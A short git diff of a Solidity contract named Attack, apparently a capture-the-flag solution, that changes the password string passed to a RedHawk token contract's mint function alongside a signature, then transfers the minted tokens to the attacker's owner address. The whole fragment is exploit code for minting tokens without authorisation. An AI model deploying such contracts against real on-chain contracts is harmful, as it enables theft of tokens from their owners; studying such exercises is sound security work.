@@ -23,7 +23,7 @@ contract Attack is Ownable {
     }
 
     function attack(bytes memory signature) external onlyOwner {
-        redhawk.mint(2, "1245", signature);
+        redhawk.mint(2, "RedHawsRulzzz133", signature);
         redhawk.transferFrom(address(this), owner(), redhawk.currentSupply());
         redhawk.transferFrom(address(this), owner(), redhawk.currentSupply() - 1);
     }
